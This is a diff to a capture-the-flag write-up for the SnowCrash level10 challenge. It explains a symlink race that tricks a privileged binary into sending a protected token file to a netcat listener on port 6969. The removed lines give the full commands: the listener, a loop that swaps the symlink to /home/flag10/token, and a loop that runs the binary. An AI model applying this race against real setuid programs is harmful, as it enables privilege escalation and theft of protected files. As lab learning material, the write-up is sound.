@@ -35,15 +35,15 @@ real sensitive file, and the binary sends it to us over the network (port 6969).
 
 To do so, we'll need 3 different terminal connected to the SnowCrash VM :
 
-Terminal 1 : nc -l 6969 > /tmp/capture.txt
+Terminal 1 : nc -lk 6969
 
-Terminal 2 : while true; do ln -sf /tmp/ok /tmp/hop; ln -sf /home/flag10/token /tmp/hop; done
+Terminal 2 : run linkScript.sh
 
-Terminal 3 : while true; do ./level10 /tmp/hop 127.0.0.1; done
+Terminal 3 : run funScript.sh
 
 CTRL+C on each terminal
 
--> cat /tmp/capture.txt
+On the first terminal we can see this output :
 
 .*( )*.
 .*( )*.
